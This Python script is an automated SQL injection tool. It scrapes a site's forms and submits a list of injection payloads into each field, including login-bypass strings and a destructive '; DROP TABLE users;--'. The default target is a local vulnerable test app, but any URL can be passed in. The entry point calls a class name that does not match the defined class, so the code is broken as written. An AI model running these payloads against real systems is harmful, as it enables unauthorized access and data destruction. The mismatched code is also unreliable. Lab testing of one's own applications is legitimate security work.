import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

class AttackPayloadGenerator:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.common_payloads = [
            "' OR '1'='1",
            '" OR "1"="1',
            "'--",
            '"--',
            "; DROP TABLE users;--",
            "' OR 1=1#",
            "admin' --",
            "1' or '1' = '1'--",
            "' OR 'x'='x' --",
        ]

    def get_forms(self, url):
        res = self.session.get(url)
        soup = BeautifulSoup(res.content, "html.parser")
        return soup.find_all("form")

    def form_details(self, form):
        details = {}
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value
            })
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def attack_form(self, url, form):
        form_details = self.form_details(form)
        vulnerabilities = []
        for payload in self.common_payloads:
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag["name"]] = input_tag["value"] + payload
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = payload
            form_url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = self.session.post(form_url, data=data)
            else:
                res = self.session.get(form_url, params=data)
            # Save all responses for logging/study
            vulnerabilities.append({
                "payload": payload,
                "url": form_url,
                "status_code": res.status_code,
                "response_snippet": res.text[:200]
            })
        return vulnerabilities

    def generate_attacks(self):
        print(f"[INFO] Sending attack payloads to {self.base_url}")
        forms = self.get_forms(self.base_url)
        all_results = []
        for idx, form in enumerate(forms):
            print(f"[INFO] Attacking form {idx+1}...")
            vulns = self.attack_form(self.base_url, form)
            all_results.extend(vulns)
        print(f"[INFO] Attack phase complete. {len(all_results)} payloads sent.")
        return all_results

if __name__ == "__main__":
    import sys
    if len(sys.argv) >= 2:
        url = sys.argv[1]
    else:
        url = "http://localhost/vulnerable_app/login.php"
    attacker = SQLiAttackGenerator(url)
    attacker.generate_attacks()
